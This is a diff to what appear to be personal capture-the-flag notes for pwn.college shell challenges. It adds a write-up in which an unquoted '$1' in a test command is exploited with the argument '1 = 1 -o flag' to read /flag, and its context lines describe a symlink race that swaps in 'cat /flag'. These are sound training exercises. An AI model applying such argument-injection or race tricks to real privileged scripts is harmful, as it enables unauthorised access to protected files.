@@ -44,3 +44,24 @@ last location where bash looks at for binary is current working directory
 ### exploit
 run /challenge/run via symlink
 while /challenge/run is waiting for newline, swap symlink with 'cat /flag'
+
+# Path of the Unquoted
+
+### chall
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/sh
+
+PATH=/usr/bin
+
+[ -n "$1" ] || exit 1
+[ "$1" = "flag" ] && exit 2
+[ $1 = "flag" ] && cat /flag
+
+echo "Goodbye!"
+```
+
+### exploit
+```sh
+/challenge/run "1 = 1 -o flag"
+```
+due to unquoted expansion, was able to substitute $1 with any string
